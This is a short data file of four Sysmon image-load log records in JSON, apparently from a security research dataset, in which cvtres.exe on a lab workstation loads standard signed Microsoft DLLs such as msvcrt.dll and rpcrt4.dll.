{"ImageLoaded":"C:\\Windows\\System32\\msvcrt.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=0EA4B3CFB14E49CEC0D42FF0F1FA989E69647A8F,MD5=36354D9B5B0A58A4B9A19103852C00A2,SHA256=E5A863D3F4BFEFED7D73A7B1499F81B7235BC9AE3C108065041BCB8E5446B1BB,IMPHASH=1273683626EBBA703979F188A1E64237","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT CRT DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"7.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.310Z","port":64545,"RecordNumber":3399267,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"msvcrt.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\sechost.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=A330EDE32DFA03AE6808EE7FB6916D8DEB8F5DDE,MD5=A094E2B38D3DD864B07580D243CB6E43,SHA256=C441E19D20961D4E990E117A300ED318BEDBF2F8BA0FF07BEE7832AC502CDDF2,IMPHASH=CE4BD072766253F6A267D0284CA82002","SourceName":"Microsoft-Windows-Sysmon","Description":"Host for SCM/SDDL/LSA Lookup APIs","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.959 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.310Z","port":64545,"RecordNumber":3399268,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"sechost.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\rpcrt4.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=863C24BD6E91FDCDEDE1124EFC93FDD1564F0C23,MD5=61C41B28689BB516F1CFC880507C839B,SHA256=DAF391DB91AC04B50A0C896963F5120A52C8B1B4999BF37BE80AB025AB116700,IMPHASH=88E7E7C7FA90052EC162DD37F2B7C7BD","SourceName":"Microsoft-Windows-Sysmon","Description":"Remote Procedure Call Runtime","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1082 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.311Z","port":64545,"RecordNumber":3399269,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"rpcrt4.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\vcruntime140_clr0400.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c602-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=6790994B2E72E7FE8690CD8EBA1FCF4577389280,MD5=63936588122BDEE9624D02CE3F8F54EA,SHA256=21F7E6165CE8DD92DB8CDF48CEE83DE64B2B0807B7B499CF87678B70C6F8C32F,IMPHASH=CD244BF7A749BF0B13E038D2EE842BFC","SourceName":"Microsoft-Windows-Sysmon","Description":"Microsoft C Runtime Library","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"14.10.25028.0 built by: VCTOOLSD15RTM","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.312Z","port":64545,"RecordNumber":3399270,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Visual Studio 2017","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe","OriginalFileName":"vcruntime140_clr0400.dll","UtcTime":"2020-09-22 08:22:43.257","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
